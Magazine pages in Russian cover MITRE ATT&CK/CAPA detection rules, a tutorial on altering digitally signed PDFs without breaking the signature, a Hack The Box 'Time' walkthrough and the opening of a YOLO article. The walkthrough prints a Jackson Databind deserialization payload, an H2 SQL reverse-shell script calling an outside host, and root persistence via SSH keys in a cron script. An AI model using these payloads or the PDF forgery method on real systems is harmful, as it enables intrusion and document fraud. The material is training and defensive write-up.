механизмов NLP (обработка текстов на естественном языке) по ключевым
словам предлагает соот ветствующую тактику или технику. Аналитику в таком
случае остается толь ко подтвердить либо отклонить предложение. Эту ути‐
литу мы рассмотрим в одном из будущих материалов.


ПРАВИЛА CAPA
Разрешения, которые зап рашивает при уста новке почти любое приложение
для Android, давно привлекают внимание ИБ‐специалистов. Обычно просят
и доступ к камере, и к микрофону, и к сети... Конечно же, чтобы отправлять
все это твоему куратору!
  Иссле дователям из FireEye это понравилось — а что мешает проверить,
какие возможности есть у определенного исполняемого файла? Сказано —
сделано, и тут в игру вступают пра вила CAPA.





           Пример Android‐приложения с его разрешени ями

При динамическом ана лизе объекта он запускается в изолированной среде
и мониторится вся активность на уровне гипервизора или спе циальных ути‐
лит. Используя CAPA‐правила (они, кстати, опенсорсные), аналитик может
сократить время, провести предваритель ный статический анализ объекта
и сконцентрироваться на потенциальных активностях и воз можнос тях прог‐
раммы по матрице MITRE ATT&CK.
   Вот как выглядит вывод CAPA при ана лизе .exe. Подопытная программа
была написана на Python и собрана в исполня емый файл с помощью au‐
to_py_to_exe.





         Пример анализа с помощью пра вил САРА файла 1.exe

Видим, что анализируемый файл использует три тактики и пять техник по мат‐
рице MITRE ATT&CK. Помимо это го, CAPA выводит список воз можнос тей
исполняемого файла по используемым функциям.





               Используемые функции объекта 1.exe

Автоматическое определение воз можнос тей в CAPA реализовано через
поиск характерных артефактов. Это используемые вызовы API, строки, кон‐
станты, создание мьютексов и сокетов, подгружаемые либы. Эти артефакты
задаются правилами (похожими на правила YARA), которые помогают выявить
функции, реализованные во вредоносе.
   Рассмотрим пример правила САРА.





             CAPA‐правило: schedule task via command line

В первую очередь CAPA извлекает строки и константы, которые могут быть
именами функций или о чем‐то говорить эксперту. Найденное раз деляется
на файловые свой ства и результаты дизассемблирования (строки, константы,
вызовы). Файловые свойства — это заголовки и импортируемые API (в том
числе названий используемых функций). В примере выше используется
логическое условие:


создание_процесса И [(строка /schtasks/i И строка / \/create /i) ИЛИ
строка /Register‐ScheduledTask /i]

То есть правило детектиру ет консольные команды, с помощью которых соз‐
даются задачи в планировщике Windows.
   Стоит упомянуть, что пра вила CAPA работают только с объектами фор‐
матов PE (Portable Executable). Для получения боль шего количества деталей
по образцу используй клю чи ‐v и ‐vv.


ВЫВОДЫ
Сообщество людей, заин тересованных в поддержке философии MITRE
ATT&CK, с каждым годом все больше, поэтому и применение этой матрицы
становится мейнстримовым.  К  примеру,  вендоры  используют ATT&CK
для создания алер тов в своих продуктах. Такой подход упрощает рассле дова‐
ние инцидентов и реагирование на них. В общем, ATT&CK — это не просто
хайп, а важная и для всего рынка кибербезопас ности база знаний.





  Матрица MITRE ATT&CK в отчете Group‐IB Polygon комплекса Threat Hunt‐
  ing Framework

Матрица позволяет стро ить модели угроз для раз ных типов компаний
и показывать, какие из извес тных угроз можно закрыть конкретными решени‐
ями. В теории это выглядит так: компания, выбира ющая решения для защиты
своей инфраструктуры, проецирует воз можнос ти злоумышленника на мат‐
рицу ATT&CK и смотрит, какие акту альные угрозы остались незакрытыми.
  Профиль кибер группировок и их кампаний по MITRE ATT&CK помогает
понять, какие инструменты используют злоумышленники, ознакомиться с их
техниками и тактиками. Эти знания поз воляют прогнозировать вероятную
точку входа в организации.
   Активное и повсеместное применение базы знаний ATT&CK позволит уни‐
фицировать подход всего сооб щес тва кибербезопас ности — как бы поможет
говорить на общем языке.
  При этом важно помнить, что две пос ледние буквы в сокращении ATT&CK
означают Common Knowledge, то есть «общеизвес тные вещи». Матрица стро‐
ится на основе уже проведенных атак и дает поведенческую справку о том,
какие TTP использовались. Бес спорно, это отличная база знаний, которая
удобна в использовании, и у нее очень сильная поддержка. Однако парадокс
в том, что она никогда полностью не опишет абсолютно все техники зло‐
умышленника, хоть и стремится имен но к этому.
ВЗЛОМ
ДРОБЬЮ
 PDFВ





                       РЕДАКТИРУЕМ
            ПОДПИСАННЫЙ ФАЙЛ PDF,
            8bit             НЕ ЛОМАЯ ПОДПИСИ
      vegelin47@mail.ru





Готов  поспорить:  ты  наверняка  не  раз  сталкивался
с документами в формате PDF, имеющими цифровую под‐
пись. Подписанные PDF‐файлы используются в контрактах
и счетах‐фактурах, еще цифровой подписью снабжаются
всевозможные выписки и справ ки на сайте Госуслуг или в
личном кабинете налогоплательщика. Цифровая подпись
должна гарантировать подлинность и целостность содер‐
жимого документа. Если его изме нят, пользователь, открыв
файл, увидит соответствующее предупреждение. Однако
это ограничение можно обойти с помощью нескольких хит‐
рых трюков.


PDF и XML — очень гибкие форматы. Гиб кость дает удобство, ради которого
приходится жертвовать безопас ностью. В обо их форматах каждый год
находят множество уязвимостей, связанных как с криптографией, так и со
структурой самого файла. И вот в очередной раз доказано: даже электронная
подпись не дает абсолютной уверенности, что в недрах электронного
документа кто‐то не покопался шаловливыми руками.


           WARNING

                      Эта публикация представлена в информацион‐
                        но‐ознакомительных целях. Ни автор, ни редак‐
                      ция не несут ответственности за любой воз‐
                    можный вред, причинен ный материала ми данной
                          статьи.



ЭКСКУРС В PDF
PDF, или Portable Document Format, — это, как видно из названия, перено‐
симый  электронный  документ. Этим форматом  пользуются  во многих
областях, прежде всего в бизнесе. PDF был раз работан компанией Adobe
еще в далеком 2005 году. Вплоть до 2020 года формат претерпевал изме‐
нения четыре раза: в него добавлялись встро енные файлы, ссылки, скрипты
и разного рода функции. Тот формат, который мы знаем на момент написа‐
ния этой статьи (PDF 2.0), вышел не так давно — в конце 2020 года вместе
с его спецификацией ISO 32000‐2.


             INFO

                    PDF включает в себя часть функций языка Post‐
                            Script. Можно транслировать PDF в PostScript.
                        Есть принтеры, которые умеют самостоятельно
                       интерпретировать PDF в PostScript.


В первом приближении структура самого документа PDF не очень сложная.
Файл состоит из сле дующих элементов:
 • заголовок (header);
 • тело файла (body);
 • таблица перекрестных ссылок (cross‐reference table);
 • блок поиска таблиц объектов и ссылок (trailer).





                        Структура PDF‐формата

Заголовок — это всегда самая пер вая строка файла, которая опре деляет
номер спецификации.





                        Заголо вок PDF

Тело содержит ссылки на объекты. К ним относятся страницы, изображения,
шрифты. Комментарии могут рас полагаться во всем PDF‐файле. Их син‐
таксис совпадает с синтаксисом коммента риев в PostScript, начинаются они
с символа % и заканчиваются символом конца стро ки.
  В таблице хранится информа ция об объектах в файле: эта таблица сос‐
тоит из разделов, количес тво которых зависит от числа объ ектов, добав‐
ленных в файл. Trailer помога ет программе, открывающей файл, находить таб‐
лицу перекрестных ссылок и специальные объекты. К слову, приложения дол‐
жны читать PDF‐файл с конца.
  Чем дальше в лес, тем больше дров: за структурой формата «прячется»
так называемая структура публикации.





                         Структура публикации

Углубляться в эти дебри мы не будем, дос таточно знать, что текст внутри
документа сжат и во внутреннос тях файла его увидеть не получится. Вот как,
например, выглядит гла ва из книги в формате PDF, если попытаться прос‐
мотреть ее как простой текстовый файл.





            Содержание PDF с точки зрения компьюте ра


АТАКА
Сначала давай разберемся с уязвимостью. Представим, что у нас есть Алиса
(подписывает документ) и Боб (получа ет подписанный Алисой документ) и,
естественно, сам документ. Алиса своим сертифика том подписала документ
и отправила его Бобу. Боб уверен в том, что документ подлинный, так как он
с подписью. Но вот что будет, если документ готовила не Алиса (она только
подписала) и отправляла тоже не она? Атака с подменой содержимого под‐
писанного документа обычно происходит в три этапа.
 1. Хакер готовит документ, в котором присутс твует так называемое теневое
   содержимое. Это можно сравнить с пустым лис том в сшитом договоре,
   куда можно добавить фрагмент после подписания.
 2. Хакер отправляет этот документ Алисе. Алиса подписывает его и отправ‐
   ляет обратно хакеру. Хакер меня ет содержимое документа так, чтобы
   не сломать подпись.
 3. Хакер отправляет измененный документ Бобу. Боб уве рен в том, что
   документ настоящий, и обра батывает его.

О существовании этой уяз вимости упоминалось еще в 2012 году, когда PDF
соответствовал спецификации ISO 19005‐3. Однако пос ле выхода новой вер‐
сии формата хакеры провели очередное исследование и привлекли вни‐
мание компаний, разрабатывающих прог раммное обеспечение для работы
с PDF.
   Есть три способа изменить содержимое уже подписанного документа:
скрытие, замена, а также скрытие и замена.


Скрытие
Результатом этой атаки будет сокрытие какого‐либо контента за видимым
содержимым файла.  Как  только  хакер  получает  подписанный  Алисой
документ, он манипулиру ет документом таким обра зом, что видимый слой
больше не отображается в приложении просмотра. Причем теперь уже ранее
невидимые объекты становятся видны в PDF‐фай ле.


Замена
Основная идея варианта «Замена» — добавить в подписанный документ
новые объекты, которые считаются без вредными, но напрямую влияют
на представление содержимого. Например, определение шрифтов напрямую
не меняет содержимое. Однако это влияет на вид отоб ражаемого контента
и делает возможной замену цифр или символов.
   Эта атака нацелена на интерактивные формы. Формы под держивают раз‐
личные маски ввода (например, текстовые поля, текстовые области, перек‐
лючатели и кнопки выбора), где пользователи динамически вводят новое
содержимое и сохраняют его в документе. Формы также могут иметь зна‐
чения по умолчанию, которые при необходимос ти можно изменить.
   Хакер готовит файл, в котором определяется шрифт, и его опи сание вклю‐
чается в документ. После подписания документа злоумышленники добавляют
новое описание шриф та и переза писы вают предыдущее. Поскольку опре‐
деление новых шрифтов считается безобидным, приложения, проверяющие
подпись, не показывают никаких предуп реждений о внесенных изменениях.


Скрытие и замена
В варианте атаки «Скрытие и замена» PDF‐файл содержит второй скры тый
документ с другим содержимым. Так как Алиса не может увидеть скрытое
содержимое, она подписывает документ. После подписания хакер получает
файл и добавляет только новую таблицу внешних ссылок и трейлер. В таб‐
лице внешних ссылок про исходит лишь одно изменение: ссылка на опи сание.
  Другими словами, хакер соз дает файл PDF, содержащий два объ екта
с одним и тем же идентификатором, но разным содержанием. Поскольку
вклю чение таблицы xref, ука зывающей на уже определен ный объ ект в под‐
писанной области, считается без вред ным, никаких предупрежде ний о вне‐
сенных хакером изменениях не пос тупает, и проверка под писи проходит
успешно. Тем не менее Боб и Алиса видят раз ный контент в одном и том же
файле.
   Этот вариант атаки наиболее мощный, так как позволяет изме нить все
содержимое документа. Хакер может соз дать теневой документ, влияющий
на отображение каждой страницы или даже на общее количество страниц,
а также на каждый содержащийся в файле объект.
  В то же время этот вариант самый «шат кий», так как при подписании могут
быть удалены неисполь зуемые объекты, в том чис ле — теневые. Кроме того,
сканер  безопасности  может  обна ружить  боль шое  количество лишних
незадействованных объектов и выдать предуп реждение.


Реализация
Я рассмотрю пер вый вид ата ки «Скрытие» с элементами атаки «Скры тие
и замена», так как они по сво ей сути похожи. Чтобы реализовать атаку, нужно
помнить: таблица перекрестных ссылок (cross‐reference table) — это обычная
текстовая таблица. Она начина ется со слова xref и содержит в себе ссыл ки
на все объекты.





               Пример таблицы перекрестных ссылок

Цифра 0 на иллюстрации выше обоз начает первый номер объекта в таблице,
334 — количество объектов. Первый элемент таблицы всегда име ет вид
XXXXXXXXXX 65535 f. 65535 — это число по умолчанию для первого элемен‐
та в таблице. F (free) — объект не используется. Напротив используемых объ‐
ектов стоит n. Далее идет XXXXXXXXXX — это смещение от начала файла
до объекта. Таких таблиц в документе будет столь ко, сколько в файле добав‐
ленных объектов.
  После таблицы идет trailer, затем значение startxref, указывающее
смещение от начала файла до таблицы. Чтение документа программой
начинается с конца. Для выполнения ата ки нам понадобятся следующие инс‐
трументы:
 • Adobe Acrobat DC;
 • КриптоПро CSP для Windows;
 • КриптоПро CSP для Linux;
 • КриптоПро PDF;
 • сертификат, ключ;
 • Notepad++ (им я редактирую внутренности PDF);
 • ImDisk.

Перед тем как мы начнем потрошить PDF‐файл, необ ходимо получить ключ
с сертификатом, которые будут пригодны для КриптоПро. Сге нерировать
ключ в OpenSSL не получит ся. Поэто му запус каем Linux‐машину, идем на сайт
КриптоПро и скачиваем дистрибутив для своей ОС (у меня он представлен
в виде файла .deb). Предварительно надо зарегистри роваться.





                  Список файлов в дис трибутиве

Устанавливаем пакет:


./install.sh

Теперь переходим в папку /opt/cprocsp/bin/amd64. Там дол жны появиться
следующие бинарники: certmgr, cpverify, cryptcp, csptest, csptestf,
curl, der2xer, genkpim, inittst, wipefile.
   Генерируем сертификат:


cryptcp ‐creatcert ‐provtype 81 ‐dn "C=RU, L=Rostov‐na‐Donu, CN=srv,
1.2.643.100.5=305867501589415" ‐exprt ‐ex ‐cont "\\\\.\\HDIMAGE\\srv"
‐ku ‐certusage "1.3.6.1.5.5.7.3.1" ‐hashAlg "1.2.643.7.1.1.2.3" ‐ca
http://www.cryptopro.ru/certsrv

В этой команде исполь зуются следующие ключи:
 • certusage — идентификатор назначения. Различают проверку сервера
   и клиента. Для нашего слу чая он неважен;
 • hashAlg — алгоритм шифрования для сертификата. Чтобы посмотреть,
   какие они есть, мож но выполнить команду cpconfig  defprov  –
  view_type;
 • СА — центр сертифика ции, который подпишет нам пару ключа с сер‐
   тификатом. Данная пара будет валидной, но действовать будет только три
   месяца;
 • сont — имя контейнера, в которое сохранится ключ с сертификатом.

Проверяем созданный контейнер:


./certmgr –list

Должен появиться контейнер как на скрин шоте ниже.





                     Контейнер в Linux‐системе

Переходим  в  папку  /var/opt/cprocsp/keys/root,  в  которой  дол жна
появиться дирек тория с именем, указанным в команде генерации этого кон‐
тейнера. В этой директории ты найдешь шесть файлов с расширени ем
.key — это и есть контейнер. Скачиваем и переки дываем его на машину
с Windows.
   Это еще не все. КриптоПро с ее CSP считает (да и правильно считает, ско‐
рее всего), что криптоконтейнер не дол жен хра ниться на жестком дис ке.
Для этого были придуманы токены. Но так как под рукой у нас токена нет,
а есть только жесткий диск, будем изобретать велосипед. Для этого нам
понадобится ImDisk. Скачиваем и уста навливаем его.
   Эта программа умеет создавать сво его рода закрытое пространство
на диске. Да, нам при дется соорудить дополнительный виртуальный HDD
у себя на компьютере. Я соз дал раз дел размером 60 Мбайт, в нем — папку
и вот в нее закинул файлы контейнера. Теперь КриптоПро видит и ключ,
и сертификат.





                         КриптоПро CSP

Переходим к подготовке самого файла. Необходимо иметь на машине редак‐
тор PDF — я выбрал проб ную версию Adobe Acrobat DC, а также КриптоПро
PDF для возможности подписать файл.
  Открываем Acrobat и соз даем пустой файл. Пишем посередине ][aker.
Сохраняем и закрываем его. Примерно так выглядят внутреннос ти пус того
файла с одним словом, которое мы ввели:


%PDF‐1.3
3 0 obj
<< /Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<< /Filter /FlateDecode /Length 86>>
stream
xњ3Rрв2Р35W(зr
QРw3T02С30PISp
    кZ*›лY)„¤(hg¦з)д¦*”д+¤§–($*Ґ–'Ґиi*„dЃф  ьM
endstream
endobj
1 0 obj
<< /Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 595.28 841.89]
>>
endobj
5 0 obj
<< /Type /Font
/BaseFont /Helvetica‐Bold
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Producer (PyFPDF 1.7.2 http://pyfpdf.googlecode.com/)
/CreationDate (D:20201116165607)
>>
endobj
7 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
>>
endobj
xref
0 8
0000000000 65535 f
0000000242 00000 n
0000000430 00000 n
0000000009 00000 n
0000000087 00000 n
0000000329 00000 n
0000000534 00000 n
0000000643 00000 n
trailer
<<
/Size 8
/Root 7 0 R
/Info 6 0 R
>>
startxref
746
%%EOF

Теперь встав ляем картинку поверх надписи, настраиваем нашу под пись
и подписываем документ. Открываем его в Notepad++ и находим xref с таб‐
лицей для нашей картинки. Меняем необ ходимые значения n на f, делая их
скрытыми.





                Замена таблицы на скрытие объекта

Сразу скажу, что можно также спря тать картинку, обозначив ее как метадан‐
ные. Их обновле ние программа не будет счи тать вмешательством в содер‐
жимое документа. Синтаксис метаданных PDF (старого образца, но он
работает до сих пор, значит, версионность форматов под держивается) мож‐
но изучить, к примеру, тут. Загружа ем файл, меняем метаданные и видим их
в разобранном виде. Далее методом проб и ошибок пытаемся под кинуть
измененные данные в файл. Должно получиться при мерно следующее:


stream
<?xpacket begin="п»ї" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.4‐c006
80.159825, 2016/09/16‐03:31:08        ">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22‐rdf‐syntax‐ns#">
      <rdf:Description rdf:about=""
            xmlns:xmp="http://ns.adobe.com/xap/1.0/"
            xmlns:dc="http://purl.org/dc/elements/1.1/"
            xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
         <xmp:ModifyDate>2019‐08‐07T13:48:36+02:00</xmp:ModifyDate>
         <xmp:MetadataDate>2019‐08‐07T13:48:36+02:00</xmp:
MetadataDate>
         <xmp:CreateDate>2019‐08‐07T11:14:22+02:00</xmp:CreateDate>
         <dc:format>application/pdf</dc:format>
         <xmpMM:DocumentID>uuid:d24ecc88‐2a52‐0b43‐9272‐3abe5e065c85
</xmpMM:DocumentID>
         <xmpMM:InstanceID>uuid:9d3cd24f‐99fe‐0849‐a303‐c9cfac889c31
</xmpMM:InstanceID>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream

После проделанной работы сохраняем файл и закрываем редактор. Наде‐
юсь, больше он нам не понадобится. Итак, мы подписали файл с фото, а при
открытии докумен та видим абсолют но дру гой контент. Это доказывает, что
уязвимость имеет место быть, однако работа ет она далеко не везде. В раз‐
ных версиях разных программ для прос мотра PDF  (кроме браузе ров)
модифицированный файл может отображаться по‐раз ному.


КАК ЗАЩИТИТЬСЯ
Компания Adobe исправила ошибки CVE‐2020‐9592 и CVE‐2020‐9596 в об‐
новлении, выпущен ном 12 мая 2020 года. Программа Foxit Reader тоже выда‐
ет предупреждение о безопас ности при попытке  открыть измененный
документ с цифровой подписью.





                     Ошибки подписи

Более  старые  версии  ПО,  к  примеру  Adobe  Acrobat  Reader DC  v
2019.021.20061, Foxit Reader 3.4.0.1012 и LibreOﬃce Draw до 6‐й версии, уяз‐
вимы для такого рода атак. Наиболее акту альная на данный момент защита —
не использовать программное обеспечение устаревших версий. Что касается
любителей посмотреть PDF через бра узер, то ни один браузер не проверяет
подпись в докумен те, а посему для них этот трюк будет работать еще очень
долго.


ЗАКЛЮЧЕНИЕ
Это не первый случай, когда безопас ность PDF‐файлов попадает в поле зре‐
ния специалистов по информа ционной безопасности. Исследователи ранее
продемонстрировали  методы   извлечения  содержимого  PDF‐файла,
защищенного паролем. Для этого использовались преиму щества частичного
шифрования, изначально поддерживаемого спецификацией PDF, чтобы уда‐
ленно извлечь содер жимое файла пос ле того, как его откроют. И это далеко
не единственная уязвимость: формат PDF эволюционирует, а значит, впереди
нас ждет еще много уди вительных открытий.
ВЗЛОМ
     HTB
 TIME





     ЗАХВАТЫВАЕМ МАШИНУ С LINUX
         ЧЕРЕЗ УЯЗВИМОСТЬ
          В ПАРСЕРЕ JSON





Сегодня мы разберемся с  уязвимостью
в парсере Jackson Databind, а затем зай‐
мемся  отслеживанием новых про цессов
в Linux, чтобы найти пути повысить привиле‐
гии. Поможет нам в этом машина Time             RalfHacker                                                                                             hackerralf8@gmail.com
с площадки Hack The Box. Ее уровень слож‐
ности заяв лен как Medium.


           WARNING

                     Подключаться к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                    жешься в общей сети с другими участниками.



РАЗВЕДКА
Адрес машины — 10.10.10.214, я всег да добавляю их в /etc/hosts, чтобы
обращаться по име ни.


10.10.10.214    time.htb

Сканируем порты при помощи Nmap. Команда ниже проведет сканирование
в два этапа — сначала общее, затем по найденным портам — со скриптами.


#! /bin/bash
ports=$( nmap ‐p‐ ‐‐min‐rate= 500 $1 | grep ^[0‐9] | cut ‐d '/' ‐f 1 |
tr '\n' ',' | sed s/,$//)
nmap ‐p$ports ‐A $1





                    Результат работы скрипта

Находим два открытых порта: 22 (служба SSH) и 80 (веб‐сервер Apache).
На SSH нам пока что ловить нечего, поэтому сразу отправляемся «пробивать»
веб.


ТОЧКА ВХОДА
И на первой же странице нас встречает поле ввода с под писью ONLINE JSON
BEAUTIFIER & VALIDATOR, из чего делаем вывод, что сайт парсит и выводит
текст в формате JSON.





                  Главная стра ница сай та http://time.htb

При поиске точки входа лучше тестировать все поля ввода на обработку
«нежелательных» символов. Они могут выполнять роль служеб ных для той
или иной технологии, и поэто му, если прог раммист не позаботился о спе‐
циальной обработке, они могут вызывать ошиб ки или другие сбои в приложе‐
нии. Я провел небольшой тест — скормил одну и ту же строчку валидаторам
разных типов. Ответ получился раз ным, а это зна чит, что обработка поль‐
зовательского ввода про исходит по‐разному.





            Реакция двух типов валидаторов на строку qwe

Во втором случае мы получаем полноценный текст ошибки:



        Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.
       JsonParseException: Unrecognized token  'qwe': was expecting  ('true',
        'false' or 'null')

Скорее, это связано с тем, что приложение еще не доведе но до ума, поэтому
и присутствует пометка Beta. Именно сюда нам и нуж но давить. Так как перед
нами парсер JSON, давай посмотрим, как он реагирует на служеб ные пос‐
ледовательности‐типы [] и {}. В ответ на такие запросы мы тоже получим
разные ошибки для разных пос ледова тельностей.





                       Реакция валида тора



        Validation failed: Unhandled Java exception: com.fasterxml.jackson.data-
       bind.exc. MismatchedInputException: Unexpected token (START_OBJECT),
      expected START_ARRAY: need JSON Array to contain As.WRAPPER_AR-
     RAY type information for class java.lang.Object





        Validation failed: Unhandled Java exception: com.fasterxml.jackson.data-
       bind.exc.InvalidTypeIdException: Could not resolve type id 'qwe' as a sub-
       type of [simple type, class java.lang.Object]: no such class found

Анализ ошибок полезен тем, что помога ет определить используемую тех‐
нологию. Это расширяет наше представление о том, как внутри устроено
приложение. В первом и во вто ром случае исклю чение генерирует Java,
а пакет называется com.fasterxml.jackson.databind.exc. Отлично, мы
определили, что там внут ри! Осталось поискать в интерне те уязвимости,
которые уже наш ли в этой программе.
  Для популярных технологий есть хорошо документированные экс плоиты,
к тому же не в одном варианте. В нашем случае достаточно запроса jackson
databind vulnerability, и Google находит уязвимость, которая может пре‐
доставить удаленное выполнение кода (RCE). Также получаем ее иден‐
тификатор  (2019‐12384)  в  базе  данных  общеизвестных  уязвимос тей
информационной безопас ности (CVE).





  Поиск задокументированных уяз вимостей в технологии Jackson Databind

Для уязвимостей с CVE на GitHub несложно найти эксплоит. Повторяем зап‐
рос и ищем готовый код. Первая же ссылка ведет нас к пол ному описанию
процесса эксплуатации.





              Поиск экспло итов для CVE‐2019‐12384


ЗАКРЕПЛЕНИЕ
Выбранная нами уязвимость заключа ется в том, что злоумышленник может
использовать десериализацию для уда лен ного выполнения кода. Дело в том,
что внутри пакета рекурсивно вызываются все сет теры с ключом, содер‐
жащимся внутри подобъекта, а именно setUrl(String url). Пос ле этого
этапа полный объект сно ва сериализуется в объект JSON. При этом все поля
сериализуются напрямую, если геттер не определен, или через явный геттер.
Когда вызывается getConnection(), соз дается база данных. Но мы можем
создать соединение с удален ной базой данных.
   Чтобы добиться пол ного выполнения кода в контексте приложения, нужно
использовать возможность загрузки драйвера H2 JDBC. H2 — это свер‐
хбыстрая база данных SQL, обычно используемая в качестве замены для пол‐
нофункциональных СУБД (таких как PostgreSQL, MS SQL, MySQL или Ora‐
cleDB). У H2 есть возможность запус кать сценарии SQL из URL‐адреса JDBC.
Это не позволяет зло умышленнику выполнить код Java внутри контекста JVM,
но у H2 есть возможность ука зывать настраиваемые псевдонимы, содер‐
жащие код Java. Именно это и позволит выполнить уда ленный код.
  А теперь перейдем к экс плуатации. В сценарии SQL, который будет заг‐
ружаться с нашего сервера, мы выполним обратный шелл и получим дос туп
к машине.


bash ‐i > & /dev/tcp/[ip]]/[port] 0>&1

Следует указать лишь адрес своего хоста и порт для обратного подключения.
При этом на локальном хосте запус каем листенер. Чтобы обес печить себе
комфортную работу (хотя бы ведение истории команд), советую использовать
оболочку rlwrap.


apt install rlwrap
rlwrap nc ‐lvp [port]

Готовый SQL‐сценарий, выполняющий реверс‐шелл, можно взять из опи‐
сания к эксплоиту (не забудь ука зать свои данные):


CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java
.io.IOException {
        String[] command = {"bash", "‐c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.
getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash ‐i >& /dev/tcp/10.10.14.73/4321 0>&1')

После сохранения сценария в файл в текущей директории запустим простой
HTTP‐сервер с помощью Python 3.


python3 ‐m http.server 8000

Пришло время отправить нагрузку через веб‐форму. Идея в том, чтобы заг‐
рузить драйвер H2 JDBC и получить уда лен ный сценарий SQL.


["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:
h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.
14.73:8000/inject.sql'"}]





                Отправка наг рузки через веб‐форму

После отправки в консоли, где запущен веб‐сервер на Python 3, мы увидим
лог, свидетельствующий о заг рузке на уда ленный хост SQL‐сценария. А в
консоли листенера получа ем обратную командную оболочку в контексте
пользователя pericles.



                     Лог локального веб‐сервера





                   Получение реверс‐шелла

Работать из этого шелла все же не очень удобно, поэтому сделаем себе дос‐
туп по SSH. Командой ssh‐keygen генерируем пару ключей на локальном
хосте. Далее — запишем id_rsa.pub в файле ~/.ssh/authorized_keys
на удаленном хосте. Подключаемся и забираем флаг пользовате ля.


ssh ‐i id_rsa pericles@time.htb





                   Запись SSH‐ключа на сервер



                       Флаг пользователя


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Как продвигаться дальше? В этом помога ют скрипты PEASS — Privilege Esca‐
lation Awesome Scripts SUITE. Они есть для всех систем, скачиваем себе
скрипт для Linux.


wget https://github.com/carlospolop/
privilege‐escalation‐awesome‐scripts‐suite/blob/master/linPEAS/
linpeas.sh

Теперь нужно загрузить его на уда ленный хост. В директории со скриптом
на локальной машине запус тим с помощью python прос той веб‐сервер. Пос‐
ле выполнения такой команды веб‐сервер будет прослушивать порт 8000.


python3 ‐m http.server

На целевой машине с помощью все того же wget загружаем скрипт с локаль‐
ного хоста на удаленный. Пос ле загрузки необ ходимо дать файлу право
на выполнение и выполнить скрипт.


wget http://[ip_локального_хоста]:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

В выводе получим серьезный мас сив информа ции. Нужно ее внимательно
изучить и выбрать важную. В нашем случае нашелся скрипт на Bash с инте‐
ресным названием time_backup (в раз деле о бэкапах он, кстати, тоже будет
упомянут).




                  Об наруженные скрипты





          Файлы, в наз вании которых есть признаки бэкапа

Мы зашли в систему от имени владельца это го файла, а значит, можем внес ти
в него изменения. Давай пос мотрим, как часто запускается этот файл.
  Для отслеживания про цес сов используем pspy64. Загрузим эту программу
на хост тем же способом, что и linpeas, а потом выпол ним. В выводе видим,
как запускался скрипт. Самое интересное — что он запус кается в контексте
пользователя с нулевого UID, а это root!


# Скачиваем на локальный хост
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/
pspy64


# Затем на удаленный
wget http://[ip_локального_хоста]:8000/pspy64
chmod +x pspy64
./pspy64





                   Вывод утилиты pspy64

Захватить рут будет легко: чуть подправим скрипт и добавим в него две
команды — первая соз даст директорию /root/.ssh, а вторая запишет
в файл /root/.ssh/authorized_keys публичный ключ. Пару ключей можно
сгенерировать заново, а можно использовать те же, которые мы генерирова‐
ли для пользователя.



            Модифицированный скрипт time_backup

Спустя несколько секунд, когда скрипт сра бота ет снова, можем подключаться
к хосту как root и забирать флаг.


ssh ‐i id_rsa root@time.htb




                       Флаг пользователя

Машина захвачена, у нас есть флаг и полный контроль над ней.
КОДИНГ
YOLO!




      ИСПОЛЬЗУЕМ НЕЙРОСЕТЬ,
     ЧТОБЫ СЛЕДИТЬ ЗА ЛЮДЬМИ
       И РАЗГАДЫВАТЬ КАПЧУ





You only look once, или YOLO, — эффектив‐
ный алгоритм, который позволяет выделять
объекты на изображении. В этой статье мы
используем его, чтобы написать на Python
программу для определения числа людей              EnjiRouz                                                                                                   enji.rouz@yandex.ru
в помещении, а по дороге опробуем его
в разгадывании капчи.


Если ты смотрел «Терминатор», то помнишь кадры из глаз T‐800: он смотрел
по сторонам и определял разные объекты. Тогда о такой машине можно было
только мечтать, а сегодня ее можно смастерить самому из готовых час тей.





                   Кадр из филь ма «Терминатор»

Распознавание объектов сегодня пригождается для решения самых разных
задач: классификации видов растений и животных, распознавания лиц, опре‐
деления габаритов объектов — и это далеко не полный список.


КАКИЕ БЫВАЮТ АЛГОРИТМЫ
Существует несколько алго ритмов обнаружения объ ектов на изображениях
и видео. Посмотрим, что они собой представляют.


R-CNN, Region-Based Convolutional Neural Network
Сперва на изображении с помощью алгоритма выборочного поис ка выделя‐
ются регионы, которые предположитель но содержат объект. Далее свер‐
точная нейронная сеть (CNN) пытается выявить приз наки объектов для каж‐
дого из этих регионов, пос ле чего машина опорных векторов классифици рует
полученные дан ные и сообщает класс обна руженного объ екта.
  Обработка в режиме реального времени: не поддерживается.


Fast R-CNN, Fast Region-Based Convolutional Neural Network
Подход аналогичен алго ритму R‐CNN. Но вместо того, чтобы предварительно
выделять регионы, мы переда ем входное изображение в CNN для создания
сверточной карты признаков, где затем будет происходить выборочный
поиск, а предсказание  класса объектов выполняет специальный слой
Softmax.
  Обработка в режиме реального времени: не поддерживается.


Faster R-CNN, Faster Region-Based Convolutional Neural Network
Подобно Fast R‐CNN, изображение переда ется в CNN соз дания сверточной
карты признаков, но вместо алго ритма выборочного поис ка для прогнозиро‐
вания предложений по регионам использует ся отдельная сеть.
